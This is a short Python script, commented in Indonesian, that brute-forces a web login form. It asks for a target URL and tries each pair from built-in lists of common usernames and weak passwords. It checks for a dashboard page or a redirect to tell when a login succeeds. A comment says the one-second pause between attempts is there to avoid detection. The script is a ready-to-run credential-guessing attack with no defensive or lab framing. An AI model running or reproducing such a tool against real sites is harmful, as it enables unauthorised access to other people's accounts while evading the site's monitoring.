import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import os
import time
from tqdm import tqdm

# Inisialisasi colorama
init(autoreset=True)

# Daftar username dan password yang lebih banyak
usernames = [
    "admin", "user", "test", "guest", "root", "administrator",
    "admin1", "admin2", "admin3", "user1", "user2", "user3"
]
passwords = [
    "password", "123456", "12345678", "qwerty", "abc123", "password1",
    "admin", "admin123", "1234", "12345", "123456789", "000000",
    "password123", "qwerty123", "letmein", "welcome", "monkey", "login",
    "pass", "password!", "secret", "root", "toor", "guest123"
]

def login(login_url, username, password):
    with requests.Session() as session:
        payload = {
            'username': username,
            'password': password,
        }
        response = session.post(login_url, data=payload)
        return response

def brute_force_login(login_url, usernames, passwords):
    for username in usernames:
        for password in passwords:
            print(f"{Fore.RED}{Style.BRIGHT}Mencoba username: {username} dan password: {password}")
            response = login(login_url, username, password)
            if "Dashboard" in response.text or response.url != login_url:  # Ganti kondisi sesuai dengan indikasi login berhasil
                print(f"{Fore.GREEN}{Style.BRIGHT}Login berhasil dengan username: {username} dan password: {password}")
                return
            time.sleep(1)  # Penundaan antara percobaan untuk menghindari deteksi
    print(f"{Fore.RED}{Style.BRIGHT}Tidak ada kombinasi yang berhasil")

if __name__ == "__main__":
    login_url = input(f"{Fore.RED}{Style.BRIGHT}Masukkan URL untuk submit login: ")
    
    print(f"{Fore.RED}{Style.BRIGHT}Mulai brute force login...")
    brute_force_login(login_url, usernames, passwords)
    print(f"{Fore.RED}{Style.BRIGHT}Proses brute force selesai")